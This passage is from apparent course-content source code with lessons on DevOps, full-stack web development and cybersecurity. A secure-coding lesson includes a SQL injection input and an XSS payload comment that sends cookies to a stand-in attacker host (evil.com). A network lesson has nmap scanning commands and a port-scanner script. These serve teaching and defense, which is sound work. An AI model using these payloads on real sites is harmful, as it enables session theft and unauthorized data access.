                    "code": "#!/bin/bash\n# deploy.sh - Automated deployment script\nset -euo pipefail  # Exit on error, undefined vars, pipe failures\n\n# Configuration\nAPP_NAME=\"my-app\"\nDEPLOY_ENV=\"${1:-staging}\"  # Default to staging\nIMAGE_TAG=\"${2:-latest}\"\nHEALTH_URL=\"http://localhost:8000/health\"\n\n# Colors for output\nGREEN='\\033[0;32m'\nRED='\\033[0;31m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1\"; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\" >&2; exit 1; }\n\n# Pre-deployment checks\nlog \"Deploying ${APP_NAME} to ${DEPLOY_ENV} with tag ${IMAGE_TAG}\"\n\ncommand -v docker >/dev/null 2>&1 || error \"Docker is not installed\"\ncommand -v docker compose >/dev/null 2>&1 || error \"Docker Compose is not installed\"\n\n# Pull latest image\nlog \"Pulling image...\"\ndocker pull \"${APP_NAME}:${IMAGE_TAG}\"\n\n# Rolling update with zero downtime\nlog \"Performing rolling update...\"\ndocker compose -f \"docker-compose.${DEPLOY_ENV}.yml\" up -d --no-deps --scale app=2 app\nsleep 10\n\n# Health check\nlog \"Running health check...\"\nfor i in $(seq 1 30); do\n    if curl -sf \"${HEALTH_URL}\" > /dev/null 2>&1; then\n        log \"Health check passed!\"\n        break\n    fi\n    if [ $i -eq 30 ]; then\n        error \"Health check failed after 30 attempts. Rolling back...\"\n    fi\n    sleep 2\ndone\n\n# Scale down old containers\ndocker compose -f \"docker-compose.${DEPLOY_ENV}.yml\" up -d --no-deps --scale app=1 app\n\nlog \"Deployment complete! ${APP_NAME} is running on ${DEPLOY_ENV}\""
                },
                {
                    "title": "Essential Linux Commands for DevOps",
                    "language": "bash",
                    "code": "# ── System Information ──\nuname -a                     # Kernel version\ncat /etc/os-release          # OS details\nfree -h                      # Memory usage\ndf -h                        # Disk usage\nnproc                        # CPU count\n\n# ── Process Management ──\nps aux | grep python         # Find Python processes\ntop -bn1 | head -20          # System overview\nkill -9 <PID>                # Force kill process\nsystemctl status nginx       # Check service status\njournalctl -u nginx -f       # Follow service logs\n\n# ── Networking ──\ncurl -I https://example.com  # HTTP headers\nnetstat -tlnp                # Open ports\nss -tlnp                     # Modern alternative to netstat\ndig example.com              # DNS lookup\ntraceroute example.com       # Network path\n\n# ── Text Processing ──\ngrep -r \"ERROR\" /var/log/    # Search logs for errors\ntail -f /var/log/syslog      # Follow log in real time\nawk '{print $1}' access.log  # Extract first column\njq '.status' response.json   # Parse JSON\nwc -l *.py                   # Count lines in Python files\n\n# ── File Permissions ──\nchmod 755 deploy.sh          # rwxr-xr-x\nchown -R www-data:www-data /var/www\nfind / -perm -4000 -type f   # Find SUID files (security audit)"
                }
            ],
            "try_it": {
                "command": "uname -a",
                "hint": "Check your system information. This is often the first thing you do when SSH-ing into a new server."
            },
            "key_takeaways": [
                "Linux is the operating system of the cloud - master the command line",
                "Use 'set -euo pipefail' at the top of every bash script",
                "Automate any task you do more than twice",
                "Learn jq for JSON processing and awk for text processing",
                "systemctl and journalctl are your friends for service management"
            ]
        }
    ]
}

FULLSTACK_DEVELOPER_CONTENT = {
    "overview": {
        "what_youll_learn": [
            "Build modern React frontends with hooks, routing, and state management",
            "Create REST APIs with Node.js/Express or Python/FastAPI",
            "Design and query relational databases with SQL and ORMs",
            "Implement authentication with JWT tokens",
            "Version control with Git and collaborative workflows",
            "Testing strategies for frontend and backend"
        ],
        "prerequisites": [
            "Basic HTML and CSS knowledge",
            "Understanding of programming concepts (variables, loops, functions)",
            "Willingness to learn both frontend and backend"
        ],
        "career_outlook": "Full stack developers are the Swiss Army knives of tech. They can build entire applications independently, making them valuable in startups and large companies alike. Strong demand across all industries, with remote work opportunities abundant."
    },
    "lessons": [
        {
            "title": "Modern React - Building User Interfaces",
            "content": "React is the most popular JavaScript library for building user interfaces. Created by Meta (Facebook), it uses a component-based architecture where you build complex UIs from small, reusable pieces.\n\n**Core React Concepts:**\n- **Components:** Reusable UI building blocks (functions that return JSX)\n- **JSX:** HTML-like syntax in JavaScript (compiled to React.createElement calls)\n- **Props:** Data passed from parent to child components (read-only)\n- **State:** Component-local data that can change over time (triggers re-renders)\n- **Hooks:** Functions that let you use state and lifecycle features (useState, useEffect, useContext)\n- **Virtual DOM:** React's efficient diffing algorithm that minimizes actual DOM updates\n\n**React Project Structure:**\n```\nsrc/\n  components/   # Reusable UI components\n  pages/        # Full page components (one per route)\n  hooks/        # Custom hooks for shared logic\n  context/      # Global state management\n  services/     # API calls and external integrations\n  utils/        # Helper functions\n```",
            "code_examples": [
                {
                    "title": "React - Complete CRUD Component",
                    "language": "javascript",
                    "code": "import React, { useState, useEffect } from 'react';\nimport axios from 'axios';\n\n// Custom hook for API calls\nfunction useApi(url) {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    const fetchData = async () => {\n      try {\n        const response = await axios.get(url);\n        setData(response.data);\n      } catch (err) {\n        setError(err.message);\n      } finally {\n        setLoading(false);\n      }\n    };\n    fetchData();\n  }, [url]);\n\n  return { data, loading, error };\n}\n\n// Task List Component\nfunction TaskList() {\n  const [tasks, setTasks] = useState([]);\n  const [newTask, setNewTask] = useState('');\n  const { data, loading } = useApi('/api/tasks');\n\n  useEffect(() => {\n    if (data) setTasks(data);\n  }, [data]);\n\n  const addTask = async () => {\n    if (!newTask.trim()) return;\n    const response = await axios.post('/api/tasks', { title: newTask });\n    setTasks([...tasks, response.data]);\n    setNewTask('');\n  };\n\n  const deleteTask = async (id) => {\n    await axios.delete(`/api/tasks/${id}`);\n    setTasks(tasks.filter(t => t.id !== id));\n  };\n\n  const toggleTask = async (id) => {\n    const task = tasks.find(t => t.id === id);\n    const response = await axios.put(`/api/tasks/${id}`, {\n      completed: !task.completed\n    });\n    setTasks(tasks.map(t => t.id === id ? response.data : t));\n  };\n\n  if (loading) return <div>Loading...</div>;\n\n  return (\n    <div>\n      <h1>My Tasks ({tasks.filter(t => !t.completed).length} remaining)</h1>\n      <div>\n        <input\n          value={newTask}\n          onChange={(e) => setNewTask(e.target.value)}\n          onKeyPress={(e) => e.key === 'Enter' && addTask()}\n          placeholder=\"Add a new task...\"\n        />\n        <button onClick={addTask}>Add</button>\n      </div>\n      <ul>\n        {tasks.map(task => (\n          <li key={task.id} style={{ textDecoration: task.completed ? 'line-through' : 'none' }}>\n            <input type=\"checkbox\" checked={task.completed} onChange={() => toggleTask(task.id)} />\n            {task.title}\n            <button onClick={() => deleteTask(task.id)}>Delete</button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n\nexport default TaskList;"
                },
                {
                    "title": "React Router - Multi-Page Application",
                    "language": "javascript",
                    "code": "import { BrowserRouter, Routes, Route, Link, Navigate } from 'react-router-dom';\nimport { useState } from 'react';\n\nfunction App() {\n  const [user, setUser] = useState(null);\n\n  return (\n    <BrowserRouter>\n      {/* Navigation Bar */}\n      <nav>\n        <Link to=\"/\">Home</Link>\n        <Link to=\"/products\">Products</Link>\n        {user ? (\n          <>\n            <Link to=\"/dashboard\">Dashboard</Link>\n            <button onClick={() => setUser(null)}>Logout</button>\n          </>\n        ) : (\n          <Link to=\"/login\">Login</Link>\n        )}\n      </nav>\n\n      {/* Routes */}\n      <Routes>\n        <Route path=\"/\" element={<Home />} />\n        <Route path=\"/products\" element={<Products />} />\n        <Route path=\"/products/:id\" element={<ProductDetail />} />\n        <Route path=\"/login\" element={<Login onLogin={setUser} />} />\n        <Route\n          path=\"/dashboard\"\n          element={user ? <Dashboard user={user} /> : <Navigate to=\"/login\" />}\n        />\n        <Route path=\"*\" element={<h1>404 - Page Not Found</h1>} />\n      </Routes>\n    </BrowserRouter>\n  );\n}"
                }
            ],
            "try_it": {
                "command": "npx create-react-app my-first-app",
                "hint": "Create a new React application. This sets up everything you need to get started."
            },
            "key_takeaways": [
                "Components are the building blocks - keep them small and focused",
                "useState for local state, useEffect for side effects (API calls, subscriptions)",
                "Props flow down, events flow up - this is React's one-way data flow",
                "Custom hooks let you extract and share stateful logic between components",
                "React Router enables multi-page experiences in single-page apps"
            ]
        },
        {
            "title": "Backend APIs with Python FastAPI",
            "content": "FastAPI is a modern, high-performance Python web framework for building APIs. It's one of the fastest Python frameworks available, with automatic API documentation, type checking, and async support.\n\n**Why FastAPI?**\n- **Fast:** Comparable performance to Node.js and Go\n- **Automatic docs:** Swagger UI and ReDoc generated from your code\n- **Type safety:** Uses Python type hints for validation\n- **Async support:** Built-in support for async/await\n- **Easy to learn:** Intuitive API design\n\n**REST API Design Principles:**\n- Use nouns for endpoints (/users, /products), not verbs\n- HTTP methods define actions: GET (read), POST (create), PUT (update), DELETE (remove)\n- Return appropriate status codes (200 OK, 201 Created, 404 Not Found)\n- Use pagination for list endpoints\n- Version your API (/api/v1/...)",
            "code_examples": [
                {
                    "title": "FastAPI - Complete REST API",
                    "language": "python",
                    "code": "from fastapi import FastAPI, HTTPException, Depends, Query\nfrom pydantic import BaseModel, EmailStr\nfrom typing import Optional, List\nfrom datetime import datetime\n\napp = FastAPI(title=\"My API\", version=\"1.0.0\")\n\n# ── Pydantic Models (request/response validation) ──\nclass UserCreate(BaseModel):\n    email: EmailStr\n    username: str\n    full_name: Optional[str] = None\n\nclass UserResponse(BaseModel):\n    id: int\n    email: str\n    username: str\n    full_name: Optional[str]\n    created_at: datetime\n\nclass ProductCreate(BaseModel):\n    name: str\n    price: float\n    description: Optional[str] = None\n\n# ── In-memory storage (use a real database in production) ──\nusers_db = []\nproducts_db = []\n\n# ── User Endpoints ──\n@app.post(\"/api/v1/users\", response_model=UserResponse, status_code=201)\nasync def create_user(user: UserCreate):\n    \"\"\"Create a new user account.\"\"\"\n    new_user = {\"id\": len(users_db) + 1, **user.dict(), \"created_at\": datetime.now()}\n    users_db.append(new_user)\n    return new_user\n\n@app.get(\"/api/v1/users\", response_model=List[UserResponse])\nasync def list_users(\n    skip: int = Query(0, ge=0),\n    limit: int = Query(10, ge=1, le=100)\n):\n    \"\"\"List all users with pagination.\"\"\"\n    return users_db[skip : skip + limit]\n\n@app.get(\"/api/v1/users/{user_id}\", response_model=UserResponse)\nasync def get_user(user_id: int):\n    \"\"\"Get a specific user by ID.\"\"\"\n    user = next((u for u in users_db if u[\"id\"] == user_id), None)\n    if not user:\n        raise HTTPException(status_code=404, detail=\"User not found\")\n    return user\n\n@app.delete(\"/api/v1/users/{user_id}\", status_code=204)\nasync def delete_user(user_id: int):\n    \"\"\"Delete a user by ID.\"\"\"\n    global users_db\n    users_db = [u for u in users_db if u[\"id\"] != user_id]\n\n# ── Health Check ──\n@app.get(\"/health\")\nasync def health_check():\n    return {\"status\": \"ok\", \"timestamp\": datetime.now().isoformat()}"
                },
                {
                    "title": "SQLAlchemy - Database ORM",
                    "language": "python",
                    "code": "from sqlalchemy import Column, Integer, String, Float, DateTime, ForeignKey, create_engine\nfrom sqlalchemy.orm import declarative_base, relationship, Session\nfrom datetime import datetime\n\nBase = declarative_base()\n\n# ── Models ──\nclass User(Base):\n    __tablename__ = 'users'\n    \n    id = Column(Integer, primary_key=True)\n    username = Column(String(50), unique=True, nullable=False)\n    email = Column(String(100), unique=True, nullable=False)\n    created_at = Column(DateTime, default=datetime.utcnow)\n    \n    # Relationship: one user has many orders\n    orders = relationship('Order', back_populates='user')\n\nclass Product(Base):\n    __tablename__ = 'products'\n    \n    id = Column(Integer, primary_key=True)\n    name = Column(String(100), nullable=False)\n    price = Column(Float, nullable=False)\n    stock = Column(Integer, default=0)\n\nclass Order(Base):\n    __tablename__ = 'orders'\n    \n    id = Column(Integer, primary_key=True)\n    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)\n    product_id = Column(Integer, ForeignKey('products.id'), nullable=False)\n    quantity = Column(Integer, default=1)\n    created_at = Column(DateTime, default=datetime.utcnow)\n    \n    user = relationship('User', back_populates='orders')\n    product = relationship('Product')\n\n# ── Usage ──\n# engine = create_engine('sqlite:///app.db')\n# Base.metadata.create_all(engine)\n# with Session(engine) as db:\n#     user = User(username='john', email='john@example.com')\n#     db.add(user)\n#     db.commit()"
                }
            ],
            "try_it": {
                "command": "curl http://localhost:8000/docs",
                "hint": "Open the FastAPI Swagger documentation to explore all available API endpoints interactively."
            },
            "key_takeaways": [
                "FastAPI generates interactive API docs automatically from your code",
                "Pydantic models validate request/response data with Python type hints",
                "Use proper HTTP methods and status codes for RESTful APIs",
                "SQLAlchemy ORM maps Python classes to database tables",
                "Always paginate list endpoints to prevent performance issues"
            ]
        },
        {
            "title": "Database Design & SQL",
            "content": "Every application needs a database. Understanding how to design schemas, write queries, and optimize performance is fundamental.\n\n**Relational Database Concepts:**\n- **Tables:** Collections of related data (users, products, orders)\n- **Rows:** Individual records\n- **Columns:** Fields/attributes of each record\n- **Primary Key:** Unique identifier for each row\n- **Foreign Key:** Links to another table's primary key\n- **Indexes:** Speed up queries on frequently searched columns\n\n**Database Design Steps:**\n1. Identify entities (users, products, orders)\n2. Define attributes for each entity\n3. Establish relationships (one-to-many, many-to-many)\n4. Normalize to reduce data duplication\n5. Add indexes for performance",
            "code_examples": [
                {
                    "title": "SQL - From Basics to Advanced",
                    "language": "sql",
                    "code": "-- ── Create Tables ──\nCREATE TABLE users (\n    id SERIAL PRIMARY KEY,\n    username VARCHAR(50) UNIQUE NOT NULL,\n    email VARCHAR(100) UNIQUE NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE TABLE products (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(100) NOT NULL,\n    price DECIMAL(10, 2) NOT NULL,\n    category VARCHAR(50),\n    stock INTEGER DEFAULT 0\n);\n\nCREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    user_id INTEGER REFERENCES users(id),\n    product_id INTEGER REFERENCES products(id),\n    quantity INTEGER NOT NULL DEFAULT 1,\n    total DECIMAL(10, 2),\n    ordered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- ── Basic Queries ──\n-- Insert data\nINSERT INTO users (username, email) VALUES ('alice', 'alice@example.com');\nINSERT INTO products (name, price, category, stock) VALUES ('Laptop', 999.99, 'Electronics', 50);\n\n-- Select with filtering\nSELECT * FROM products WHERE price < 500 AND stock > 0 ORDER BY price ASC;\n\n-- ── Joins (combining tables) ──\nSELECT u.username, p.name AS product, o.quantity, o.total\nFROM orders o\nJOIN users u ON o.user_id = u.id\nJOIN products p ON o.product_id = p.id\nWHERE o.ordered_at > '2024-01-01';\n\n-- ── Aggregation ──\nSELECT category, COUNT(*) AS product_count, AVG(price) AS avg_price\nFROM products\nGROUP BY category\nHAVING COUNT(*) > 5\nORDER BY avg_price DESC;\n\n-- ── Subqueries ──\nSELECT username FROM users\nWHERE id IN (\n    SELECT user_id FROM orders\n    GROUP BY user_id\n    HAVING SUM(total) > 1000\n);\n\n-- ── Index for performance ──\nCREATE INDEX idx_orders_user ON orders(user_id);\nCREATE INDEX idx_products_category ON products(category);"
                }
            ],
            "try_it": {
                "command": "sqlite3 --version",
                "hint": "Check if SQLite is available. It's a lightweight database perfect for learning SQL."
            },
            "key_takeaways": [
                "Design your database schema before writing any application code",
                "Primary and foreign keys enforce data integrity",
                "JOINs combine data from multiple tables - master INNER, LEFT, and RIGHT joins",
                "Indexes dramatically speed up queries but slow down writes - add them wisely",
                "Always use parameterized queries to prevent SQL injection"
            ]
        },
        {
            "title": "Git & Collaborative Development",
            "content": "Git is the universal version control system. Every developer must be proficient with Git for tracking changes, collaborating with teams, and managing code releases.\n\n**Git Workflow (Feature Branch):**\n1. Create a branch from main: `git checkout -b feature/new-login`\n2. Make changes and commit frequently\n3. Push branch and create a Pull Request\n4. Team reviews the code\n5. Merge to main after approval\n6. Delete the feature branch\n\n**Best Practices:**\n- Write clear commit messages (imperative mood: \"Add login page\", not \"Added login page\")\n- One logical change per commit\n- Never commit secrets or large binary files\n- Use .gitignore to exclude build artifacts and dependencies\n- Pull and rebase before pushing to avoid merge conflicts",
            "code_examples": [
                {
                    "title": "Git - Essential Commands",
                    "language": "bash",
                    "code": "# ── Setup ──\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"your@email.com\"\n\n# ── Daily Workflow ──\ngit status                           # Check what's changed\ngit diff                             # See exact changes\ngit add -p                           # Stage changes interactively\ngit commit -m \"Add user login page\"  # Commit with clear message\ngit push origin feature/login        # Push to remote\n\n# ── Branching ──\ngit branch                           # List branches\ngit checkout -b feature/new-thing    # Create and switch branch\ngit switch main                      # Switch to main\ngit merge feature/new-thing          # Merge feature into current\ngit branch -d feature/new-thing      # Delete merged branch\n\n# ── Collaboration ──\ngit pull origin main                 # Get latest changes\ngit fetch --all                      # Download all remote refs\ngit rebase main                      # Rebase current onto main\ngit stash                            # Temporarily save changes\ngit stash pop                        # Restore stashed changes\n\n# ── History & Debug ──\ngit log --oneline --graph -20        # Visual commit history\ngit blame filename.py                # Who changed each line?\ngit bisect start                     # Binary search for bugs\n\n# ── Undo Mistakes ──\ngit checkout -- file.txt             # Discard file changes\ngit reset HEAD file.txt              # Unstage a file\ngit revert HEAD                      # Undo last commit (safe)\ngit commit --amend                   # Fix last commit message"
                }
            ],
            "try_it": {
                "command": "git log --oneline -10",
                "hint": "View the last 10 commits in this repository."
            },
            "key_takeaways": [
                "Commit early and often with clear, descriptive messages",
                "Use feature branches to isolate work from the main branch",
                "Pull requests enable code review and knowledge sharing",
                "Learn git rebase for clean, linear history",
                "Never force-push to shared branches (main/develop)"
            ]
        }
    ]
}

CYBERSECURITY_CONTENT = {
    "overview": {
        "what_youll_learn": [
            "Network security fundamentals and protocols",
            "Web application security (OWASP Top 10)",
            "Penetration testing methodology and tools",
            "Incident response and threat analysis",
            "Cryptography and secure communications",
            "Security compliance frameworks (SOC 2, ISO 27001)"
        ],
        "prerequisites": [
            "Strong understanding of networking (TCP/IP, DNS, HTTP/HTTPS)",
            "Linux command line proficiency",
            "Basic programming skills (Python recommended)",
            "Understanding of web application architecture"
        ],
        "career_outlook": "Cybersecurity has a global talent shortage of 3.5 million professionals. Every organization needs security expertise, from startups to governments. Certifications like CISSP, CEH, and CompTIA Security+ significantly boost career prospects."
    },
    "lessons": [
        {
            "title": "Network Security Fundamentals",
            "content": "Network security is the foundation of cybersecurity. Understanding how networks work and how they can be attacked is essential for defending them.\n\n**The OSI Model & Security at Each Layer:**\n- **Layer 7 (Application):** WAF, API security, input validation\n- **Layer 4 (Transport):** TLS/SSL, port security\n- **Layer 3 (Network):** Firewalls, IP filtering, VPNs\n- **Layer 2 (Data Link):** MAC filtering, VLAN segmentation\n- **Layer 1 (Physical):** Physical access control, cable security\n\n**Key Security Concepts:**\n- **Defense in Depth:** Multiple layers of security controls\n- **Zero Trust:** Never trust, always verify - even internal traffic\n- **Least Privilege:** Users and services get minimum necessary access\n- **CIA Triad:** Confidentiality, Integrity, Availability\n\n**Common Network Attacks:**\n- **DDoS:** Overwhelming a target with traffic\n- **Man-in-the-Middle:** Intercepting communications\n- **DNS Spoofing:** Redirecting traffic to malicious servers\n- **ARP Poisoning:** Redirecting local network traffic\n- **Port Scanning:** Discovering open services to exploit",
            "code_examples": [
                {
                    "title": "Network Reconnaissance & Analysis",
                    "language": "bash",
                    "code": "# ── Network Information Gathering ──\n# Check your network configuration\nip addr show\nifconfig\n\n# DNS lookup\nnslookup example.com\ndig example.com ANY\n\n# Trace the route to a destination\ntraceroute example.com\n\n# ── Port Scanning with Nmap (authorized testing only!) ──\n# Basic scan of common ports\nnmap -sV 192.168.1.1\n\n# Full port scan with service detection\nnmap -sV -sC -p- 192.168.1.1\n\n# Scan a subnet for live hosts\nnmap -sn 192.168.1.0/24\n\n# Detect operating system\nnmap -O 192.168.1.1\n\n# ── Traffic Analysis ──\n# Capture packets on interface eth0\ntcpdump -i eth0 -c 100 -w capture.pcap\n\n# Filter for HTTP traffic\ntcpdump -i eth0 port 80 -A\n\n# Monitor connections\nnetstat -tuln\nss -tuln\n\n# ── Firewall Rules (iptables) ──\n# List current rules\niptables -L -v -n\n\n# Allow SSH only from specific IP\niptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j DROP\n\n# Allow HTTP/HTTPS\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# Drop all other incoming traffic\niptables -A INPUT -j DROP"
                },
                {
                    "title": "Python - Network Security Scanner",
                    "language": "python",
                    "code": "#!/usr/bin/env python3\n\"\"\"Simple security audit script for authorized testing only.\"\"\"\nimport socket\nimport ssl\nimport subprocess\nfrom datetime import datetime\n\ndef check_open_ports(host, ports):\n    \"\"\"Scan common ports on a host.\"\"\"\n    print(f\"\\n[*] Scanning {host} for open ports...\")\n    open_ports = []\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            service = socket.getservbyport(port, 'tcp') if port < 1024 else 'unknown'\n            print(f\"  [OPEN] Port {port} ({service})\")\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\ndef check_ssl_certificate(hostname):\n    \"\"\"Verify SSL certificate validity.\"\"\"\n    print(f\"\\n[*] Checking SSL certificate for {hostname}...\")\n    context = ssl.create_default_context()\n    try:\n        with socket.create_connection((hostname, 443), timeout=5) as sock:\n            with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                cert = ssock.getpeercert()\n                not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')\n                days_left = (not_after - datetime.now()).days\n                print(f\"  Certificate valid until: {not_after}\")\n                print(f\"  Days remaining: {days_left}\")\n                if days_left < 30:\n                    print(\"  [WARNING] Certificate expires soon!\")\n    except Exception as e:\n        print(f\"  [ERROR] SSL check failed: {e}\")\n\ndef check_http_headers(url):\n    \"\"\"Check for security headers.\"\"\"\n    import urllib.request\n    print(f\"\\n[*] Checking security headers for {url}...\")\n    req = urllib.request.Request(url)\n    response = urllib.request.urlopen(req, timeout=5)\n    headers = response.headers\n    \n    security_headers = {\n        'Strict-Transport-Security': 'HSTS',\n        'X-Content-Type-Options': 'Content Type Sniffing Protection',\n        'X-Frame-Options': 'Clickjacking Protection',\n        'Content-Security-Policy': 'CSP',\n        'X-XSS-Protection': 'XSS Protection',\n    }\n    \n    for header, description in security_headers.items():\n        value = headers.get(header)\n        status = '[OK]' if value else '[MISSING]'\n        print(f\"  {status} {description} ({header}): {value or 'Not set'}\")\n\n# Usage (authorized targets only):\n# check_open_ports('localhost', [22, 80, 443, 3306, 5432, 8080, 8443])\n# check_ssl_certificate('example.com')\n# check_http_headers('https://example.com')"
                }
            ],
            "try_it": {
                "command": "nslookup google.com",
                "hint": "Perform a DNS lookup to understand how domain names resolve to IP addresses."
            },
            "key_takeaways": [
                "Security must be implemented at every layer of the network stack",
                "Zero Trust architecture assumes breach and verifies everything",
                "Always get written authorization before performing security testing",
                "Firewalls are your first line of defense - configure them restrictively",
                "Regular vulnerability scanning is essential for maintaining security"
            ]
        },
        {
            "title": "Web Application Security (OWASP Top 10)",
            "content": "The OWASP Top 10 represents the most critical web application security risks. Understanding these vulnerabilities is essential for both attacking and defending web applications.\n\n**OWASP Top 10 (2021):**\n1. **Broken Access Control** - Users acting outside their permissions\n2. **Cryptographic Failures** - Weak encryption or exposed sensitive data\n3. **Injection** - SQL, NoSQL, OS command injection\n4. **Insecure Design** - Missing security controls by design\n5. **Security Misconfiguration** - Default configs, unnecessary features\n6. **Vulnerable Components** - Using known-vulnerable dependencies\n7. **Authentication Failures** - Weak login, session management\n8. **Software/Data Integrity Failures** - Unverified updates, CI/CD issues\n9. **Logging & Monitoring Failures** - Insufficient audit trails\n10. **Server-Side Request Forgery (SSRF)** - Exploiting server to make requests\n\n**Key Defense Strategies:**\n- Input validation and sanitization on ALL user inputs\n- Parameterized queries (never concatenate SQL strings)\n- Output encoding to prevent XSS\n- Strong authentication (MFA, bcrypt password hashing)\n- Principle of least privilege for all access controls",
            "code_examples": [
                {
                    "title": "Vulnerable vs. Secure Code Examples",
                    "language": "python",
                    "code": "# ════════════════════════════════════════════\n# VULNERABLE CODE (DO NOT USE IN PRODUCTION)\n# ════════════════════════════════════════════\n\n# 1. SQL Injection - VULNERABLE\ndef get_user_vulnerable(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    # Attacker input: ' OR '1'='1' -- \n    # Results in: SELECT * FROM users WHERE username = '' OR '1'='1' --'\n    cursor.execute(query)\n\n# 2. XSS - VULNERABLE  \ndef render_comment_vulnerable(comment):\n    return f\"<div>{comment}</div>\"\n    # Attacker input: <script>document.location='http://evil.com/steal?c='+document.cookie</script>\n\n# 3. Hardcoded Secret - VULNERABLE\nSECRET_KEY = \"my-super-secret-key-12345\"\nDATABASE_PASSWORD = \"admin123\"\n\n\n# ════════════════════════════════════════════\n# SECURE CODE (USE THIS INSTEAD)\n# ════════════════════════════════════════════\n\n# 1. SQL Injection - SECURE (parameterized query)\ndef get_user_secure(username):\n    query = \"SELECT * FROM users WHERE username = %s\"\n    cursor.execute(query, (username,))  # Parameters handled safely\n\n# 2. XSS - SECURE (output encoding)\nfrom markupsafe import escape\ndef render_comment_secure(comment):\n    return f\"<div>{escape(comment)}</div>\"\n\n# 3. Secrets - SECURE (environment variables)\nimport os\nSECRET_KEY = os.environ.get('SECRET_KEY')\nDATABASE_PASSWORD = os.environ.get('DATABASE_PASSWORD')\n\n# 4. Password Hashing - SECURE (bcrypt)\nfrom passlib.context import CryptContext\npwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto')\n\ndef hash_password(password: str) -> str:\n    return pwd_context.hash(password)\n\ndef verify_password(plain: str, hashed: str) -> bool:\n    return pwd_context.verify(plain, hashed)\n\n# 5. Rate Limiting - Prevent brute force\nfrom fastapi import Request\nfrom collections import defaultdict\nimport time\n\nlogin_attempts = defaultdict(list)\n\ndef is_rate_limited(ip: str, max_attempts: int = 5, window: int = 300) -> bool:\n    now = time.time()\n    login_attempts[ip] = [t for t in login_attempts[ip] if now - t < window]\n    if len(login_attempts[ip]) >= max_attempts:\n        return True\n    login_attempts[ip].append(now)\n    return False"
                }
            ],
            "try_it": {
                "command": "curl -I http://localhost:8000",
                "hint": "Check the HTTP security headers of the local API server."
            },
            "key_takeaways": [
                "Never trust user input - validate and sanitize everything",
                "Use parameterized queries to prevent SQL injection",
                "Store passwords with bcrypt, never as plaintext or simple hashes",
                "Keep dependencies updated to patch known vulnerabilities",
                "Implement rate limiting and account lockout to prevent brute force"
            ]
        },
        {
            "title": "Cryptography & Secure Communications",
            "content": "Cryptography protects data confidentiality and integrity. Understanding encryption fundamentals is critical for implementing secure systems.\n\n**Types of Encryption:**\n- **Symmetric:** Same key for encrypt/decrypt (AES-256). Fast, used for data at rest.\n- **Asymmetric:** Public/private key pairs (RSA, ECC). Slower, used for key exchange and signatures.\n- **Hashing:** One-way transformation (SHA-256, bcrypt). Used for passwords and integrity.\n\n**TLS/SSL (HTTPS):**\nTLS encrypts data in transit between client and server:\n1. Client sends Hello with supported cipher suites\n2. Server responds with certificate and chosen cipher\n3. Key exchange establishes shared secret\n4. Symmetric encryption begins for actual data transfer\n\n**Key Management Best Practices:**\n- Never hardcode encryption keys in source code\n- Use AWS KMS, HashiCorp Vault, or Azure Key Vault\n- Rotate keys regularly\n- Use separate keys for different environments",
            "code_examples": [
                {
                    "title": "Python Cryptography Examples",
                    "language": "python",
                    "code": "from cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nimport base64\nimport os\nimport hashlib\nimport hmac\n\n# ── Symmetric Encryption (Fernet/AES) ──\n# Generate a key\nkey = Fernet.generate_key()\ncipher = Fernet(key)\n\n# Encrypt\nplaintext = b\"Sensitive data: credit card 4111-1111-1111-1111\"\nciphertext = cipher.encrypt(plaintext)\nprint(f\"Encrypted: {ciphertext[:50]}...\")\n\n# Decrypt\ndecrypted = cipher.decrypt(ciphertext)\nprint(f\"Decrypted: {decrypted.decode()}\")\n\n# ── Password-Based Key Derivation ──\ndef derive_key_from_password(password: str, salt: bytes = None):\n    \"\"\"Derive an encryption key from a user's password.\"\"\"\n    if salt is None:\n        salt = os.urandom(16)\n    kdf = PBKDF2HMAC(\n        algorithm=hashes.SHA256(),\n        length=32,\n        salt=salt,\n        iterations=480000,\n    )\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\n    return key, salt\n\n# ── Hashing for Integrity Verification ──\ndef hash_file(filepath: str) -> str:\n    \"\"\"Generate SHA-256 hash of a file.\"\"\"\n    sha256 = hashlib.sha256()\n    with open(filepath, 'rb') as f:\n        for chunk in iter(lambda: f.read(8192), b''):\n            sha256.update(chunk)\n    return sha256.hexdigest()\n\n# ── HMAC for Message Authentication ──\ndef create_hmac(message: str, secret_key: str) -> str:\n    \"\"\"Create HMAC signature to verify message integrity.\"\"\"\n    return hmac.new(\n        secret_key.encode(),\n        message.encode(),\n        hashlib.sha256\n    ).hexdigest()\n\ndef verify_hmac(message: str, secret_key: str, signature: str) -> bool:\n    \"\"\"Verify HMAC signature.\"\"\"\n    expected = create_hmac(message, secret_key)\n    return hmac.compare_digest(expected, signature)  # Timing-safe comparison"
                }
            ],
            "try_it": {
                "command": "openssl s_client -connect google.com:443 -brief",
                "hint": "Inspect the TLS certificate and connection details for google.com."
            },
            "key_takeaways": [
                "Use AES-256 for symmetric encryption, RSA-2048+ or ECC for asymmetric",
                "Never implement your own cryptography - use well-tested libraries",
